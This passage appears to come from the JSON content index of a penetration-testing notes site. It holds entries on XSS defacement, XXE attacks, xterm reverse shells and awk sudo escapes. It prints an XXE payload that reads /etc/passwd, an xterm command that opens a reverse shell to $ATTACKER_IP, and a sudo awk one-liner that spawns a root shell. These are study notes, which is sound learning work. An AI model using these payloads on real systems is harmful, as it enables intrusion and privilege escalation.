7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h3&gt;\n&lt;p&gt;&lt;a href=&quot;https://github.com/aabeling/portscan&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;An example JavaScript port scanner (possibly broken).&lt;svg aria-hidden=&quot;true&quot; class=&quot;external-icon&quot; style=&quot;max-width:0.8em;max-height:0.8em&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/p&gt;\n&lt;h3 id=&quot;website-defacement&quot;&gt;Website defacement&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#website-defacement&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h3&gt;\n&lt;p&gt;You can access elements of the DOM using &lt;code&gt;document.getElementById(&quot;element-id&quot;)&lt;/code&gt; or &lt;code&gt;document.querySelector(&quot;#element-id&quot;)&lt;/code&gt;. The &lt;code&gt;querySelector()&lt;/code&gt; method is a bit more flexible (you can use CSS-style selectors here) and should probably be preferred.&lt;/p&gt;\n&lt;p&gt;To get/set the content of an element, use the innerHTML method (to insert HTML directly into the DOM), or alternately innerText or textContent to set element text &lt;em&gt;only&lt;/em&gt;.&lt;/p&gt;\n&lt;p&gt;Note that &lt;code&gt;&amp;#x3C;script/&gt;&lt;/code&gt; tags inserted by setting an element’s innerHTML are &lt;em&gt;not&lt;/em&gt; executed, however!&lt;/p&gt;\n&lt;h2 id=&quot;defenses&quot;&gt;Defenses&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#defenses&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;p&gt;The key to defending against XSS is really to get your encoding right. User-generated code that’s passed off to JavaScript needs to be JavaScript-escaped first. User-generated code that’s written into the DOM needs to be HTML-escaped first. Know what the context is of your data, and escape/unescape appropriately when writing data from one context to another!&lt;/p&gt;"},"spells/XXE-attacks":{"slug":"spells/XXE-attacks","filePath":"spells/XXE attacks.md","title":"XML external entity (XXE) attacks","links":["spells/Uniform-resource-locators","spells/RCE-via-XXE-in-PHP"],"tags":["AttackCycle/Exploitation/XXE","Standard/URI","FileFormat/XML"],"content":"The trick with XXE attacks is that the URIs defined in an XML !DOCTYPE directive are basically just includes. This means that when an application is expecting XML input (mostly this is a thing you find over APIs), you can extend the provided DTDs in an ad hoc fashion.\nFirst, an example DTD from TryHackMe:\n&lt;!DOCTYPE note [\n\t&lt;!ELEMENT note (to, from, heading, body)&gt;\n\t&lt;!ELEMENT to (#PCDATA)&gt;\n\t&lt;!ELEMENT from (#PCDATA)&gt;\n\t&lt;!ELEMENT heading (#PCDATA)&gt;\n\t&lt;!ELEMENT body (#PCDATA)&gt;\n]&gt;\nThis defines the following XML:\n&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;\n&lt;!DOCTYPE note SYSTEM &quot;note.dtd&quot;&gt;\n&lt;note&gt;\n    &lt;to&gt;foo&lt;/to&gt;\n    &lt;from&gt;bar&lt;/from&gt;\n    &lt;heading&gt;baz&lt;/heading&gt;\n    &lt;body&gt;etc.&lt;/body&gt;\n&lt;/note&gt;\n(#PCDATA indicates “parsable character data” — an XML-encoded string. The special SYSTEM keyword basically means “this URI/file is hosted by the current system”, and can be included in both !DOCTYPE and !ENTITY declarations.)\nThere are three basic important XML bits here:\n\n!DOCTYPE defines the document type and the root element.\n!ELEMENT defines additional elements (so if I understand this correctly, a !DOCTYPE declaration must contain at least one !ELEMENT with the same name).\n!ENTITY defines entities like &amp;gt; — basically shortcuts for other data. There seems to be a lot more to XML entities than just this though…\n\nBasically, you can think of the bit between the brackets ([]) in the DTD as getting slotted into the URI specifying the DTD in the XML !DOCTYPE. In fact, we can insert additional document type definitions into the end of a !DOCTYPE statement in this way; combining this with the SYSTEM declaration can allow us to read any files the webserver has access to.\n&lt;?xml version=&quot;1.0&quot;?&gt;\n&lt;!DOCTYPE root [\n\t&lt;!ENTITY read SYSTEM &quot;file:///etc/passwd&quot;&gt;\n]&gt;\n&lt;root&gt;&amp;read;&lt;/root&gt;\nNote that the added !DOCTYPE declaration doesn’t have to correspond to the !DOCTYPE the server is using (since these definitions are concatenated). So don’t spend too much time coming up with a !DOCTYPE in order to define your !ENTITY — any “garbage” !DOCTYPE will do.\nThis basically strikes me as more-or-less the same thing as an injection attack, just that we’re targeting the XML parser rather than the website code.\nRemote code execution\nTransclude of RCE-via-XXE-in-PHP","richContent":"&lt;p&gt;The trick with XXE attacks is that the &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/Uniform-resource-locators&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/Uniform-resource-locators&quot;&gt;URIs&lt;/a&gt; defined in an XML &lt;code&gt;!DOCTYPE&lt;/code&gt; directive are basically just includes. This means that when an application is expecting XML input (mostly this is a thing you find over APIs), you can extend the provided DTDs in an ad hoc fashion.&lt;/p&gt;\n&lt;p&gt;First, an example DTD from TryHackMe:&lt;/p&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;dtd&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;dtd&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;&amp;#x3C;!DOCTYPE note [&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;\t&amp;#x3C;!ELEMENT note (to, from, heading, body)&gt;&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;\t&amp;#x3C;!ELEMENT to (#PCDATA)&gt;&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;\t&amp;#x3C;!ELEMENT from (#PCDATA)&gt;&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;\t&amp;#x3C;!ELEMENT heading (#PCDATA)&gt;&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;\t&amp;#x3C;!ELEMENT body (#PCDATA)&gt;&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;]&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;\n&lt;p&gt;This defines the following XML:&lt;/p&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;xml&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;xml&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;&amp;#x3C;?&lt;/span&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#4D9375&quot;&gt;xml&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt; version&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;=&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;1.0&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt; encoding&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;=&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;UTF-8&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;?&gt;&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;&amp;#x3C;!&lt;/span&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#4D9375&quot;&gt;DOCTYPE&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; note&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt; SYSTEM &quot;note.dtd&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;&amp;#x3C;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#4D9375&quot;&gt;note&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;    &amp;#x3C;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#4D9375&quot;&gt;to&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;&gt;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;foo&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;&amp;#x3C;/&lt;/span&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#4D9375&quot;&gt;to&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;    &amp;#x3C;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#4D9375&quot;&gt;from&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;&gt;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;bar&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;&amp;#x3C;/&lt;/span&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#4D9375&quot;&gt;from&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;    &amp;#x3C;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#4D9375&quot;&gt;heading&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;&gt;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;baz&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;&amp;#x3C;/&lt;/span&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#4D9375&quot;&gt;heading&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;    &amp;#x3C;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#4D9375&quot;&gt;body&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;&gt;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;etc.&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;&amp;#x3C;/&lt;/span&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#4D9375&quot;&gt;body&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;&amp;#x3C;/&lt;/span&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#4D9375&quot;&gt;note&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;\n&lt;p&gt;(&lt;code&gt;#PCDATA&lt;/code&gt; indicates “parsable character data” — an XML-encoded string. The special SYSTEM keyword basically means “this &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/Uniform-resource-locators&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/Uniform-resource-locators&quot;&gt;URI&lt;/a&gt;/file is hosted by the current system”, and can be included in both &lt;code&gt;!DOCTYPE&lt;/code&gt; and &lt;code&gt;!ENTITY&lt;/code&gt; declarations.)&lt;/p&gt;\n&lt;p&gt;There are three basic important XML bits here:&lt;/p&gt;\n&lt;ul&gt;\n&lt;li&gt;&lt;code&gt;!DOCTYPE&lt;/code&gt; defines the document type &lt;em&gt;and&lt;/em&gt; the root element.&lt;/li&gt;\n&lt;li&gt;&lt;code&gt;!ELEMENT&lt;/code&gt; defines additional elements (so if I understand this correctly, a &lt;code&gt;!DOCTYPE&lt;/code&gt; declaration must contain at least one &lt;code&gt;!ELEMENT&lt;/code&gt; with the same name).&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;https://xmlwriter.net/xml_guide/entity_declaration.shtml&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;&lt;code&gt;!ENTITY&lt;/code&gt; defines entities like &lt;code&gt;&amp;#x26;gt;&lt;/code&gt; — basically shortcuts for other data.&lt;svg aria-hidden=&quot;true&quot; class=&quot;external-icon&quot; style=&quot;max-width:0.8em;max-height:0.8em&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt; There seems to be a lot more to XML entities than just this though…&lt;/li&gt;\n&lt;/ul&gt;\n&lt;p&gt;Basically, you can think of the bit between the brackets (&lt;code&gt;[]&lt;/code&gt;) in the DTD as getting slotted into the &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/Uniform-resource-locators&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/Uniform-resource-locators&quot;&gt;URI&lt;/a&gt; specifying the DTD in the XML &lt;code&gt;!DOCTYPE&lt;/code&gt;. In fact, we can insert additional document type definitions into the end of a &lt;code&gt;!DOCTYPE&lt;/code&gt; statement in this way; combining this with the &lt;code&gt;SYSTEM&lt;/code&gt; declaration can allow us to read any files the webserver has access to.&lt;/p&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;xml&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;xml&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;&amp;#x3C;?&lt;/span&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#4D9375&quot;&gt;xml&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt; version&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;=&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;1.0&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;?&gt;&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;&amp;#x3C;!&lt;/span&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#4D9375&quot;&gt;DOCTYPE&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; root&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt; [&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;\t&amp;#x3C;!&lt;/span&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#4D9375&quot;&gt;ENTITY&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; read&lt;/span&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#4D9375&quot;&gt; SYSTEM &lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;file:///etc/passwd&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;]&gt;&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;&amp;#x3C;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#4D9375&quot;&gt;root&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;&gt;&amp;#x26;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt;read&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;;&amp;#x3C;/&lt;/span&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#4D9375&quot;&gt;root&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;\n&lt;p&gt;Note that the added &lt;code&gt;!DOCTYPE&lt;/code&gt; declaration &lt;em&gt;doesn’t&lt;/em&gt; have to correspond to the &lt;code&gt;!DOCTYPE&lt;/code&gt; the server is using (since these definitions are concatenated). So don’t spend too much time coming up with a &lt;code&gt;!DOCTYPE&lt;/code&gt; in order to define your &lt;code&gt;!ENTITY&lt;/code&gt; — any “garbage” &lt;code&gt;!DOCTYPE&lt;/code&gt; will do.&lt;/p&gt;\n&lt;p&gt;This basically strikes me as more-or-less the same thing as an injection attack, just that we’re targeting the XML parser rather than the website code.&lt;/p&gt;\n&lt;h2 id=&quot;remote-code-execution&quot;&gt;Remote code execution&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#remote-code-execution&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;p&gt;&lt;/p&gt;&lt;blockquote class=&quot;transclude&quot; data-url=&quot;RCE-via-XXE-in-PHP&quot; data-block=&quot;&quot; data-embed-alias=&quot;RCE via XXE in PHP&quot;&gt;&lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/RCE-via-XXE-in-PHP&quot; class=&quot;transclude-inner internal alias&quot; data-slug=&quot;spells/RCE-via-XXE-in-PHP&quot;&gt;Transclude of RCE-via-XXE-in-PHP&lt;/a&gt;&lt;/blockquote&gt;&lt;p&gt;&lt;/p&gt;"},"spells/Xterm":{"slug":"spells/Xterm","filePath":"spells/Xterm.md","title":"Xterm","links":[],"tags":["Application/Xterm","Protocol/X11","AttackCycle/LateralMovement"],"content":"\n\n                  \n                  Note\n                  \n                \n\n\nAdapted from slyth11907 / Cheatsheets / Cheatsheet_ReverseShells.\n\n\n\nRemember that the X11 protocol is network based! You can thus get xterm to act as a reverse shell by simply providing it with a display pointing to your machine.\nxterm -display $ATTACKER_IP:$DISPLAY_NUM\nThe connection will be made back on port 6000 + $DISPLAY_NUM (so, 6000 for display 0, 6001 for display 1, etc.).\nThis, of course, requires a running X server on your end (for example, Xnest :1). You’ll need to make sure that connections from the target system are authorized.\nxhost +$TARGET_IP","richContent":"&lt;blockquote class=&quot;callout note&quot; data-callout=&quot;note&quot;&gt;\n&lt;div class=&quot;callout-title&quot;&gt;\n                  &lt;div class=&quot;callout-icon&quot;&gt;&lt;/div&gt;\n                  &lt;div class=&quot;callout-title-inner&quot;&gt;&lt;p&gt;Note&lt;/p&gt;&lt;/div&gt;\n                  \n                &lt;/div&gt;\n&lt;div class=&quot;callout-content&quot;&gt;\n&lt;div class=&quot;callout-content-inner&quot;&gt;\n&lt;p&gt;Adapted from &lt;a href=&quot;https://github.com/slyth11907/Cheatsheets/blob/master/Cheatsheet_ReverseShells#L36&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;slyth11907 / Cheatsheets / Cheatsheet_ReverseShells&lt;svg aria-hidden=&quot;true&quot; class=&quot;external-icon&quot; style=&quot;max-width:0.8em;max-height:0.8em&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;.&lt;/p&gt;\n&lt;/div&gt;\n&lt;/div&gt;\n&lt;/blockquote&gt;\n&lt;p&gt;Remember that the X11 protocol is network based! You can thus get xterm to act as a reverse shell by simply providing it with a display pointing to your machine.&lt;/p&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;xterm&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -display&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt; $ATTACKER_IP&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;:&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;$DISPLAY_NUM&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;\n&lt;p&gt;The connection will be made back on port 6000 + &lt;code&gt;$DISPLAY_NUM&lt;/code&gt; (so, 6000 for display 0, 6001 for display 1, etc.).&lt;/p&gt;\n&lt;p&gt;This, of course, requires a running X server on your end (for example, &lt;code&gt;Xnest :1&lt;/code&gt;). You’ll need to make sure that connections from the target system are authorized.&lt;/p&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;xhost&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; +&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;$TARGET_IP&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;"},"spells/awk":{"slug":"spells/awk","filePath":"spells/awk.md","title":"awk","links":["spells/sudo"],"tags":["Application/awk","Application/sudo","AttackCycle/PrivEsc"],"content":"If awk can be run with NOPASSWD via sudo, then you can use the following to break out into a root shell:\nsudo awk &#039;BEGIN {system(&quot;/bin/sh&quot;)}&#039;","richContent":"&lt;p&gt;If awk can be &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/sudo&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/sudo&quot;&gt;run with NOPASSWD via sudo&lt;/a&gt;, then you can use the following to break out into a root shell:&lt;/p&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;sudo&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; awk&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt; &#039;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;BEGIN {system(&quot;/bin/sh&quot;)}&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&#039;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;"},"spells/basenc":{"slug":"spells/basenc","filePath":"spells/basenc.md","title":"basenc","links":[],"tags":["Application/basenc","Standard/Base64","Application/base64"],"content":"# Encode 